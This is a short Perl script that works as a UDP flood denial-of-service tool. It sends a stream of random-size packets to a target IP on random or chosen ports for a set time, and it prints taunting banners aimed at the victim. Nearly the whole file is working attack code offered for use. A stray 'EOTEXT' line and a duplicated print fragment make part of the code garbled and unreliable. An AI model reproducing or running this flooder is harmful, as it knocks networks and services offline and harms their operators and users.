#!/usr/bin/perl
 
use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
##
# @germanely
##
 
use Socket;
use strict;
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
  
print "Get Your Shit Ran By Germanely";
   
EOTEXT 
 
 print           "                      <<<Should've stopped flexing>>> $ip
                        On port " .
        ($port ? $port : "random") ." ".($time ? "for $time seconds" : "
Talk shit to the king? Bad Idea! ") . "\n";
        ($port ? $port : "random") ." ".($time ? "for $time seconds" : "
Talk shit to the king? Wrong! ") . "\n";
        print "Stop Slamming with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}